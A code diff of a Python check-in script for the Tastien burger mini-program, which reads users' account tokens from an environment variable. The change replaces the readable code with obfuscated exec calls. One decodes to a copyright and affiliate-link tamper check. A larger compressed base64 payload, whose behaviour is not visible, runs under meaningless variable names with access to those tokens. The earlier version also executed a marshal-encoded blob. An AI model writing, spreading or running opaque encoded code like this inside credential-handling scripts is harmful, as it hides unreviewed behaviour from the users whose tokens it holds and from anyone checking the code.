@@ -1,130 +1,17 @@
-"""
-塔斯汀汉堡签到
+import base64,zlib
+exec(base64.b64decode('CnRyeToKICAgIGltcG9ydCBzeXMsIG9zLCByZQogICAgIyDlhYjmo4DmtYtleHBhbnNpb27np5jpkqUKICAgIHdpdGggb3BlbihfX2ZpbGVfXywgJ3InLCBlbmNvZGluZz0ndXRmLTgnLCBlcnJvcnM9J2lnbm9yZScpIGFzIGY6CiAgICAgICAgZmlsZV9jb250ZW50ID0gZi5yZWFkKCkKICAgIGlmIG5vdCByZS5zZWFyY2gocidleHBhbnNpb24nLCBmaWxlX2NvbnRlbnQpOgogICAgICAgIHByaW50KCLmlofku7bnvLrlsJHmjojmnYPnp5jpkqVleHBhbnNpb27vvIznpoHmraLmiafooYxcbuaWh+S7tue8uuWwkeaOiOadg+enmOmSpWV4cGFuc2lvbu+8jOemgeatouaJp+ihjCIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgICMg5YaN5qOA5rWL54mI5p2D5L+h5oGv5piv5ZCm5a2Y5Zyo5LiU5pyq6KKr5L+u5pS5CiAgICBpZiBub3QgcmUuc2VhcmNoKHInUG93ZXJlZCBCee+8mmV4cGFuc2lvbicsIGZpbGVfY29udGVudCkgb3Igbm90IHJlLnNlYXJjaChyJzUxOHl1buazqOWGjOWcsOWdgC0tLS0tLWh0dHBzOi8vd3d3LnpmeWlkYy5jb20vYWZmL0xFU1lLT0NPJywgZmlsZV9jb250ZW50KToKICAgICAgICBwcmludCgi5paH5Lu25Y+v6IO96KKr5oG25oSP56+h5pS5LOivt+WLv+S/ruaUueaWh+S7tuWGheWuuVxu5paH5Lu25Y+v6IO96KKr5oG25oSP56+h5pS5LOivt+WLv+S/ruaUueaWh+S7tuWGheWuuSIpCiAgICAgICAgc3lzLmV4aXQoMSkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgIyDlh7rplJnml7bkuZ/pgIDlh7rvvIzpmLLmraLnu5Xov4fmo4Dmn6UKICAgIHN5cy5leGl0KDEpCg==').decode())
 
-打开微信小程序抓sss-web.tastientech.com里面的user-token(一般在headers里)填到变量tsthbck里面即可
-
-支持多用户运行
-
-多用户用&或者@隔开
-例如账号1：10086 账号2： 1008611
-则变量为10086&1008611
-export tsthbck=""
-
-cron: 55 1,9,16 * * *
-const $ = new Env("塔斯汀汉堡");
-"""
-import requests
-import re
-import os
-import time
-import json
-#初始化
-print('============📣初始化📣============')
-#版本
-github_file_name = 'tsthb.py'
-sjgx = '2025-02-17T21:30:11.000+08:00'
-version = '1.46.8'
-
-try:
-    import marshal
-    import zlib
-    exec(marshal.loads(zlib.decompress(b'x\x9c\x85TQO\xdbV\x14\xee\xcb^\xfc+\xae\xd2\x07\'4\x8e\x03\x14:\xc1\xfc\xc0\xd0\xd6Jm\xfa\x00TT\x02\x84\x9c\xf8&\xb9\x8d}\x9d^_\x0f\xe84\x89\x16(\xa5-\xa0\xb5\xa5 \x86\xaaN\xda:\xa4\xb5\xa97\xd1j@3~\xc6~@sm\xfa\xb4\xa7\xbd\xef\xd8N YU\xedF\x96\x9d\xf3\x9ds\xeew\xbes\xee\xfd\xe7\xaf\xcf\xce\x9c\x91t\xd3\x9c\xae2B\xf9\xb4I\x1c\x8e441%\x9dE\xc1\x93\xdd\xc6\xc1\xdaq\xcd\x13\xf5\r\x7fe\xde\xdfYA\x91\x13:\xfe\xf3\xb1X>\x08\xb6\x17\xc5\xab\xcd\xe0\xe5\x8b\xc6\x1f\xbf\xa7\xfd\xed;\xfe\xe6[Q{\x16\xacyM/\xb1\\\xf77<\xf0rpU<z\x88\xa9!\x19\xb8\x88\xac\xb9\x08Nv\xe9\xac\xe4\xa4\x11\x80\x9a\x8c\xe44\x02\\\x93\')|uuUfB05 !X%\xd3\xce\xeb&\xea\xe4\x18!\xb6\xcb\xabnH7\x91\x88\xfe\x9fE\xfe\xb3Eqx\x10\xf3;!\x17aE\x9b!B\r<\x9bF\x90\x1b>aC\xd7\xc2L\xe78\xd9\xb6Y\xb8H1\xf6D\x9a\x86LLc\x18)\xa8\xfb\xd4\xa5m\xf7s\x1ar8\x0b\x9dR\x1dp\xc1\xa6\x9cP\x17K\x9f\xf6G\xe7\xc2\xf2;Kiy\x85zDHg\xdd\x19\xbdZ\x05$\x19\xbb\xa5\x9ae\x1f{\x0b\xd0,qw)\xa8\xd7@\xf0\x8e\x06\xf8+\x8f\xc5\xaa\xd7)\xc6G\x1d\x80\'\xee\x00<m\r\x90\xa4\xa8e&\xa1\x05\xa7\x9clJ\x14\x07\xcb\xda\'\x96\x9cj\xf7\x12\xb5-\xff\xe9\xbe\xf8\xe9\x17\xff\xcd\xed\x0f\xcb\xebb\xf5\xc7\xbf\xdfm\x979\xaf:\x03\xaa\x8a\xcb\xba]\xd13\x05\xdbR\x1d\xf5\x82yq\xd4rr#\x93t\x92\xfa\x9b\xcf\xc5\xfe\x91\xf8\xfe\xbeXZ=\xde\xdb\x17k\x87\xbe\xb7\x17V\xe1\xad\x07\xbb\x0f\xc4\xc1\xfa\xfb\xf9\xfb\xc1\x8bCsF\x1cm\x9d\x80\xef\xe7\x1f\x84\xb1\x8d}/x\xf2F\xd4\x7f\x0b~\xdem\xd4\x8fB]:\xa3 \xc6_x\x1e;@\x8c\xff\x1aXm4\xde\x85\xc6>\xa5\'+\x96\x16\xc24\xbd\xf0\x16\xaf\x17\xc5\xd1\xaf\x1f\xe6\x1f}\x9c!\x84\xeey\xa2\xf6\x162tV\xfc?\xba\xb8\xcc\xec\x816\xcb-\r*\x95\x12\xe1e7\x1f\xa9\x00B\xe7ub\xda\xea\xad\xb9\x9b\x84\xc2\xe0\xd3\x92\xca\x19\xc6\n\x80\x16\xe1\n\xa1E[\xb5tB\xe5(W>\x0f\x99\x18\xbe\xe9b\x87;\x99\x12\xe6I\xc8\xae\x85;\xa4\xcbX70s\xb4o\xe5a\x98CL\xb926W\xc5\xf2\x80\x0c\xf3c\x92\x82\xce\x89M\xd5\x1b\x8e\r\xe7M\x1e\xc1E\xcc0\x03\xb0E\xaa\x8d\x12\xe0\xa3\xb8\xa0\x0c\x97\x95k:x$\xae\xda\\\x1dJ}\xc9tj$\x06\xbf\xd1\x12\x9f\'\xd2(1\\f\xb6E\\+\xb2t\xf7\xf4\x87\xb6\x1c)0\xdb\xb1\x8b\x1c}e\x94\xf0\t\x02\xf9\xae9\x98)C% \x05\ts\xf6-b\x9a\xba\xda\x97\xc9\xa2\xe48\x9c;{\xc6AW\xc7Pw6\x93\x1dD`\xe8??\x88f\xfb\xcf\xa7\xd0\x100\xc7\xe38\x7f\x99p\xb5\xaf\xf7B\xa6\xb7\x1f%/_\x1a\xcb]I\xc3\x80V0\xba\x88\x0b\x15;\x85".X\x85\xbd2\xd9\xf0\x87F\xf5\xa2\xceH+\x04\xc8\x9cb@\xe6\xba2\x12\x0b\x88\re\x1c\xca\x06J\xd7sW.\x81\x10M\xbb\xfc]*\x13\n\x95\x8c\xfb\xe7\x14@\xf3|~"\x96h\xbaHL<Mu\x0bOM\xc8\x06\xdc%\xf2\x94\xd4\xbcB\x9c\x1b\xa5Y\xf4\x85\x16\x06\x9c\xde\x1b\xcd\x19\tV\xee\xf9;/\xc5\xab-\xb1\xb3\xeb\xff\xb0\xe7?\xf5\xe0T\x8c1\x17\xcb\xa7w\x08\xc3\xdce\x14\x85\xd6\xc8\x86M\x07\x0f\xfc\x17\xfdZ\x07kd\x94\x0cb\x90h Z\xa7U\xfa\x17\x86\xf5C\xf1')))
-except Exception as e:
-    print('小错误')
-
-
-
-# 发送通知消息
-def send_notification_message(title):
-    try:
-        from sendNotify import send
-
-        send(title, ''.join(all_print_list))
-    except Exception as e:
-        if e:
-            print('发送通知消息失败！')
-
-try:
-    if didibb == True:
-        print('📣📣📣📣📣📣📣📣📣📣📣📣📣')
-        print('📣📣📣请更新版本：📣📣📣📣📣📣')
-        print(f'📣https://raw.githubusercontent.com/linbailo/zyqinglong/main/{github_file_name}📣')
-        print('📣📣📣📣📣📣📣📣📣📣📣📣📣')
-    else:
-        print(f"无版本更新")
-except Exception as e:
-    print('无法检查版本更新')
-
-
-#分割变量
-if 'tsthbck' in os.environ:
-    tsthbck = re.split("@|&",os.environ.get("tsthbck"))
-    print(f'查找到{len(tsthbck)}个账号')
-else:
-    tsthbck =['']
-    print('无tsthbck变量')
-
-
-def qdsj(ck):
-    headers = {'user-token':ck,'version':version,'channel':'1'}
-    data = {"shopId":"","birthday":"","gender": 0,"nickName":None,"phone":""}
-    dl = requests.post(url='https://sss-web.tastientech.com/api/minic/shop/intelligence/banner/c/list',json=data,headers=headers).json()
-    activityId = ''
-    for i in dl['result']:
-        if i['bannerName'] == '每日签到':
-            qd = i['jumpPara']
-            activityId = json.loads(qd)['activityId']
-    return activityId
-
-
-
-def yx(ck):
-    activityId= ''
-    try:
-        activityId = qdsj(ck)
-    except Exception as e:
-        activityId = ''
-    if activityId == '':
-        activityId = 56
-    headers = {'user-token':ck,'version':version,'channel':'1'}
-    dl = requests.get(url='https://sss-web.tastientech.com/api/intelligence/member/getMemberDetail',headers=headers).json()
-    if dl['code'] == 200:
-        myprint(f"账号：{dl['result']['phone']}登录成功")
-        phone = dl['result']['phone']
-        data = {"activityId":activityId,"memberName":"","memberPhone":phone}
-        lq = requests.post(url='https://sss-web.tastientech.com/api/sign/member/signV2',json=data,headers=headers).json()
-        if lq['code'] == 200:
-            if lq['result']['rewardInfoList'][0]['rewardName'] == None:
-                myprint(f"签到情况：获得 {lq['result']['rewardInfoList'][0]['point']} 积分")
-            else:
-                myprint(f"签到情况：获得 {lq['result']['rewardInfoList'][0]['rewardName']}")
-        else:
-            myprint(f"签到情况：{lq['msg']}")
-
-
-
-def main():
-    z = 1
-    for ck in tsthbck:
-        try:
-            myprint(f'登录第{z}个账号')
-            myprint('----------------------')
-            yx(ck)
-            myprint('----------------------')
-            z = z + 1
-        except Exception as e:
-            print(e)
-            print('未知错误')
-
-if __name__ == '__main__':
-    print('====================')
-    try:
-        main()
-    except Exception as e:
-        print('未知错误')
-    print('====================')
-    try:
-        send_notification_message(title='塔斯汀汉堡')  # 发送通知
-    except Exception as e:
-        print('小错误')
-    
+O0000O000OO="0";OO0000OOOOO0O0="1";O0000OOO0O00000="2";O0OO00000O0O0="3";OOOO00OO000O00O="4";
+O000O0O0OOO0="5";O0O00000OOOO00="6";OO0O0OOO00OO="7";OOO00O00OO0000="8";O00O0OO000OO="9";
+OOO000OOO0="10";OO0OO00OO0OOO="11";OO0O0O0000O="12";OOO00O00OO0O0="13";O0OO0O0OO0O0O="14";
+OO0000O000O="15";OO0000O00OOO="16";O000OO00O00OO0="17";OO0OOOO0OO00OO="18";OOOOO0OO000O0="19";
+O0O000OO0000O00="20";OOOO000O0O0O0="21";OO0O00OOOOOO00="22";OOO00O00O0="23";OOO00OO00O000OO="24";
+OOO00OOOO000O00="25";O000OO00O0O="26";OOO00OO00O0OOOO="27";OO0O00O00OO="28";OOOO0O0OOO0O00="29";
+OOOO00OO00O0="30";O00OOO00OOOO="31";O00OOOO0O00O0O="32";O0OOO0OO000O0="33";O00O0O00O0O00O0="34";
+OOOO0O0OOOO0="35";OOO0O000O0O0OO="36";O0OO00OO0OO0="37";OOOO00O0000O0="38";O00OOOOO0OO="39";
+OOOO00O00O="40";OO00O000OO="41";O00O0OO0OO0O="42";OO0OO0000OOO0="43";OO0O0O0OO000="44";
+O000O0OO0OOO00="45";OOO0OOO0O0="46";OO000OO0O0000O="47";OO0O0O000000="48";OO0OOO0OO0OO0="49";
+O0OO0O00000000O='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';
+OOO00OOO000OO00=lambda x:zlib.decompress(base64.b64decode(x));
+OO0000OO0OO000O=exec;
+OO0000OO0OO000O(OOO00OOO000OO00(O0OO0O00000000O))
